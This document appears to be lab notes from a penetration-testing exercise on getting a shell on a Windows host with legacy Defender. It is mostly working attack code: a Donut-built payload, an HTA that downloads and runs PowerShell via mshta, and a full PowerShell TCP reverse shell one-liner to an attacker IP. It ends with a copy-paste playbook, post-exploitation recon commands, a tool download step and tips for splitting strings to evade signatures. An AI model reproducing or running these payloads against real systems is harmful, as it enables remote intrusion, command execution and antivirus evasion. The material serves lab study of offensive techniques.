# HTA → PowerShell Reverse Shell (Lab Notes)

**Goal:** Obtain a shell on a Windows target with legacy Windows Defender (circa 2020) by delivering and executing a payload that bypasses static signatures.
Can be used for initial shell.
---

## Environment & Constraints
- Target: Windows (likely x64), legacy Defender signatures.
- Attacker: Kali-like Linux VM (tun0: `10.10.14.6`).
- Egress uncertainty (443/80/8080/53).
- Disk space constraints on attacker box → built/served from `/dev/shm`.
- Initial payload: `smb.exe` (x86) → Donut → `shell.ps1`.
- Delivery: `.hta` executed via `mshta`.

---

## Attempt A (Donut + HTA) — **Delivered, no session**
**What we did**
1. Donut on x86 binary (kept 32-bit):
   ```bash
   donut -i smb.exe -f 6 -a 1 -e 3 -b 3 -o shell.ps1
   ```
2. Served files:
   ```bash
   cd /dev/shm && python3 -m http.server 80
   ```
3. HTA wrapper (forced 32-bit PS to match x86 shellcode):
   ```html
   <html><head><script language="VBScript">
   Dim cmd
   cmd = "%windir%\SysWOW64\WindowsPowerShell1.0\powershell.exe -nop -w hidden -ep bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.6/shell.ps1')"""
   CreateObject("Wscript.Shell").Run cmd,0
   </script></head><body></body></html>
   ```
4. Triggered:
   ```powershell
   mshta http://10.10.14.6/policy_2025.hta
   ```

**What we observed**
- HTTP server logs showed:
  - `GET /policy_2025.hta` (HTA executed)
  - `GET /shell.ps1` (PS downloaded Donut script)
  - Instrumented canaries confirmed 32‑bit PS, bytes downloaded, and post‑`IEX` reached.
- **No callback** to Metasploit (likely staging/arch/payload mismatch or egress filter).

**Key gotchas identified**
- PowerShell `-enc` expects **UTF‑16LE** base64, not UTF‑8.
- x86 shellcode must run under **SysWOW64** PowerShell on x64 hosts.
- Staged Meterpreter often flagged/blocked; handler/payload must match exactly (arch + staged/stageless + protocol).

---

## Working Approach B (Raw PS TCP reverse shell) — **Success**
We pivoted away from Meterpreter/Donut and used a minimal PowerShell reverse TCP one‑liner embedded directly in an HTA.

### 1) Listener (attacker)
```bash
rlwrap nc -lvnp 443
```

### 2) HTA (served from `/dev/shm/rs.hta`)
```html
<html><head><script language="VBScript">
Dim cmd
cmd = "%windir%\SysWOW64\WindowsPowerShell1.0\powershell.exe -nop -w hidden -ep bypass -c ""$null=(iwr http://10.10.14.6/ps_ran_rev);$h='10.10.14.6';$p=443;$c=New-Object Net.Sockets.TCPClient($h,$p);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);try{$o=(iex $d 2>&1|Out-String)}catch{$o=$_.Exception.Message};$o=$o+'PS '+(pwd).Path+'> ';$sb=[Text.Encoding]::ASCII.GetBytes($o);$s.Write($sb,0,$sb.Length)}$c.Close()"""
CreateObject("Wscript.Shell").Run cmd,0
</script></head><body></body></html>
```

> Notes:
> - **SysWOW64** path forces 32‑bit PowerShell (consistent with our earlier x86 payloads).
> - The `iwr ... /ps_ran_rev` HTTP canary gave immediate proof PS started on target.
> - This approach avoids Donut/Meterpreter stagers and their signatures.

### 3) Serve & trigger
```bash
cd /dev/shm && python3 -m http.server 80
mshta http://10.10.14.6/rs.hta?t=1
```

**Result:** `rlwrap nc` received a connection. Commands (e.g., `whoami`) executed interactively.

---

## Verification Artifacts (HTTP server logs)
Typical success sequence:
```
GET /rs.hta?t=1        200
GET /ps_ran_rev        200 (canary; any 200/404 proves PS started)
```
(When using the Donut flow earlier, also saw `GET /shell.ps1` and canaries like `/canary?arch=32`, `/canary?afterIEX`.)

---

## Post‑Exploitation Quick Checks
Run immediately after shell lands:
```powershell
whoami /all
hostname
$env:COMPUTERNAME; $env:USERDOMAIN; $env:USERDNSDOMAIN
ipconfig /all
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
net localgroup administrators
query user
```
Download tools:
```powershell
$wc=New-Object Net.WebClient
$wc.DownloadFile('http://10.10.14.6/tool.exe','C:\Windows\Temp	ool.exe')
```

---

## Why Attempt A failed (most likely)
- **Staging/Signature**: Staged Meterpreter stagers are commonly detected even by 2020 Defender.
- **Handler mismatch**: Any mismatch (x86/x64, http/https, staged/stageless) results in silence.
- **Egress**: Handler port may have been filtered; raw TCP shell on 443 worked reliably.

---

## Disk Space Remediation (attacker)
To recover space quickly:
```bash
rm -rf ~/.msf4/{loot,logs,bootsnap_cache}/*
rm -rf ~/.nuget/packages/*
sudo apt clean && sudo apt autoremove --purge -y
sudo journalctl --vacuum-time=3d
find ~/Covenant -type d \( -name bin -o -name obj -o -name publish \) -prune -exec rm -rf {} +
```
Build artifacts in RAM to avoid future ENOSPC:
```bash
export TMPDIR=/dev/shm
cd /dev/shm
```

---

## Repro Playbook (copy/paste)
```bash
# 1) Listener
rlwrap nc -lvnp 443

# 2) Create HTA
cat > /dev/shm/rs.hta <<'HTA'
<html><head><script language="VBScript">
Dim cmd
cmd = "%windir%\SysWOW64\WindowsPowerShell1.0\powershell.exe -nop -w hidden -ep bypass -c ""$null=(iwr http://10.10.14.6/ps_ran_rev);$h='10.10.14.6';$p=443;$c=New-Object Net.Sockets.TCPClient($h,$p);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);try{$o=(iex $d 2>&1|Out-String)}catch{$o=$_.Exception.Message};$o=$o+'PS '+(pwd).Path+'> ';$sb=[Text.Encoding]::ASCII.GetBytes($o);$s.Write($sb,0,$sb.Length)}$c.Close()"""
CreateObject("Wscript.Shell").Run cmd,0
</script></head><body></body></html>
HTA

# 3) Serve
cd /dev/shm && python3 -m http.server 80

# 4) Trigger on target
# mshta http://10.10.14.6/rs.hta?t=1
```

---

## Optional Hardening/OPSEC
- Randomize variable/class names and split suspicious strings (e.g., 'Net.Sock'+'ets.TCP'+'Client').
- Use allowed egress port (443/80/8080/53), validated by `tcpdump`.
- After you’re in, consider pivoting to a more feature‑rich agent over the same egress port.

---

*These notes are for lab/education use only, matching the environment controlled in this exercise.*
